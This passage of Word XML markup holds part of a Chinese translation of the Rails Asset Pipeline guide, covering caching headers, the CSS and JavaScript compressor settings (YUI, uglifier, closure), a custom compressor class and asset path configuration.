              <w:t>config.assets.compile = true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5FF7B6D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在第一次请求时，资源会被编译并以上面开发模式给出的方式被缓存。还有就是在 helpers 里用到的 manifest 的名字被改成含有 MD5 哈希值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2DB18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Sprockets 同时会将 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Cache-Control</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP 头部设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>max-age=31536000</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. 这告诉所有在你客户端浏览器和服务器之间的缓存将会被缓存 1 年。这样做的作用是减少了向服务器对这些资源的请求数量；这些资源能很好的缓存在本地浏览器缓存或者一些中间缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D00E2C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这个模式使用更多的内存， 比默认的运行得更慢。也不建议这么做。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46080E5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如果你将一个产品应用程序部署到任何没有预装 JavaScript 运行时的系统上时，你应该想要加入这个到你的 Gemfile 里:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5746124F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E1AB54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group :production do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21A891C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gem 'therubyracer'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AED28E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363940FC"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5 自定义 Pipline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7EC6AF"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5.1 CSS 压缩器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1398F7D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通常都选 YUI 压缩 CSS. </w:t>
      </w:r>
      <w:hyperlink r:id="rId966" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>YUI</w:t>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>CSS</w:t>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> compressor</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 提供最小化功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6821B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下面几行会启用 YUI 压缩器，这需要 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>yui-compressor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3D7AF8CB" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BE2F919" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1860777077"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.css_compressor = :yui</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="31A74CE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config.assets.compress</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 必须被设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 才能使用 CSS 压缩器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A3D1200"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5.2 JavaScript 压缩器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E8880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JavaScript 可选的压缩器有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:closure</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:uglifier</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:yui</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。 它们分别需要 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>closure-compiler</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>uglifier</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>yui</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gems。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB7627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Gemfile 默认包括 </w:t>
      </w:r>
      <w:hyperlink r:id="rId967" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>uglifier</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 这个 gem 用 Ruby 封装了 </w:t>
      </w:r>
      <w:hyperlink r:id="rId968" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>UglifierJS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (为 NodeJS 所编写). 它通过去除空白符去压缩你的代码。它也包括其它的可定制选项如尽可能的将 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表达式改成三元表达式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4849349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如下引入 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>uglifier</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> JavaScript 压缩器:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="77A849DA" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B744C84" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2085105561"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.js_compressor = :uglifier</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0E26319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注意必须将 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.compress</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 才能使用 JavaScript 压缩器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4988B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为了使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>uglifier</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，你需要 </w:t>
      </w:r>
      <w:hyperlink r:id="rId969" w:anchor="readme" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ExecJS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 支持的运行时。如果你使用 Mac OS X 或者 Windows， 你的系统已经安装有 JavaScript 运行时了。 查阅 </w:t>
      </w:r>
      <w:hyperlink r:id="rId970" w:anchor="readme" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ExecJS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文档了解支持的 JavaScript 运行时.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220F5915"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5.3 使用你自己的压缩器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D94AB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CSS 和 JavaScript 的压缩器配置设置也接受任何对象。 这个对象必须有一个接受一个字符串参数的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>compress</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法并且必须返回一个字符串。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="307F13C2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4814A21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class Transformer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A9AB14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 compress(string)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B90E79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do_something_returning_a_string(string)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01112EB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0B394E5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1625C8A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传递一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象给 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的配置选项：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="02C7530E" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="428EFE87" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1794787979"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.css_compressor = Transformer.new</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33C9FF54"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 xml:space="preserve">5.4 改变 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6754F8A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Sprockets 默认使用的公共路径为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/assets</w:t>
